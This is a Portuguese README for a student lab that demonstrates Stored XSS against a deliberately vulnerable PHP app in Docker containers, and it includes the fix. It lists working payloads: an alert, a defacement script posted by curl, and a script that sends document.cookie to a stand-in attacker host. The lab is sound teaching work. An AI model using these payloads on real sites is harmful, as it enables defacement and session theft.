# xss-projeto

Demonstração prática de ataque **Stored XSS (Cross-Site Scripting Persistente)**
em uma infraestrutura de containers Docker.

Projeto desenvolvido para a disciplina de Computação em Nuvem — Bacharelado em Ciência da Computação — IFPR Câmpus Pinhais.

---

## Descrição

Este projeto implementa um ambiente controlado com três containers Docker
interconectados para demonstrar na prática como um ataque Stored XSS funciona,
desde a injeção do payload até sua execução persistente no navegador de qualquer
usuário que acesse a aplicação comprometida.

---

## Containers

| Container       | Imagem           | Função                                      |
|-----------------|------------------|---------------------------------------------|
| banco           | mysql:8.0        | Banco de dados MySQL com a tabela de comentários |
| app-vulneravel  | php:8.2-apache   | Aplicação PHP intencionalmente vulnerável   |
| atacante        | alpine:latest    | Container com curl para ataques via rede    |

Todos os containers se comunicam pela rede bridge interna `rede-xss`.

---

## Pré-requisitos

- Docker 20.10+
- Docker Compose 2.x

---

## Como Executar

1. Clone o repositório:
```
   git clone https://github.com/nahasBeatriz/XSS-CloudComputing_Cybersecurity.git
   cd xss-projeto
```
3. Suba o ambiente:
```
   docker compose up -d --build
```
4. Acesse a aplicação no navegador:
```
   http://localhost:8080
```
5. Para verificar os containers em execução:
```
   docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}"
```
6. Para encerrar o ambiente:
```
   docker compose down
```
---

## Ataques Demonstrados

### 1. Popup de alerta (via navegador)

No campo "Comentário" do blog, insira:
```
   <script>alert('Stored XSS! Este script está salvo no banco de dados!')</script>
```
Clique em Enviar. O script será executado imediatamente e a cada recarga da página.

### 2. Defacement (via container)
```
   docker exec -it atacante sh
```
```
   curl -X POST http://app-vulneravel:80 \
     -d "autor=Container+Atacante" \
     -d "conteudo=<script>document.body.style.background='red';document.body.innerHTML='<h1 style=color:white;text-align:center;margin-top:200px>BANCO DE DADOS COMPROMETIDO!</h1>'</script>"
```
Acesse ``http://localhost:8080`` no navegador para ver o resultado.

### 3. Simulação de roubo de sessão (via navegador)

No campo "Comentário", insira:
```
   <script>document.location='http://atacante/?cookie='+document.cookie</script>
```
O navegador tentará redirecionar para o servidor do atacante enviando os cookies
como parâmetro na URL.

### 4. Verificar persistência no banco de dados
```
   docker exec -it banco mysql -uroot -psenha123 blogdb \
     -e "SELECT id, autor, conteudo, criado_em FROM comentarios;"
```
### 5. Verificar scripts no HTML pela rede interna
```
   docker exec atacante sh -c "curl -s http://app-vulneravel:80 | grep script"
```
---

## Correção da Vulnerabilidade

A vulnerabilidade está na linha de exibição do `index.php`:
```
   // VULNERÁVEL
   <?= $c['conteudo'] ?>

   // SEGURO
   <?= htmlspecialchars($c['conteudo'], ENT_QUOTES, 'UTF-8') ?>
```
---

## Especificação da Máquina Utilizada

- SO: Ubuntu 24.04.4 LTS (Noble Numbat) 64-bit
- Processador: Intel Core i5-1135G7
- RAM: 8 GB
- Armazenamento: SSD 512 GB

---

## Referências

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- Docker Docs: https://docs.docker.com/
- PHP htmlspecialchars: https://www.php.net/manual/pt_BR/function.htmlspecialchars.php
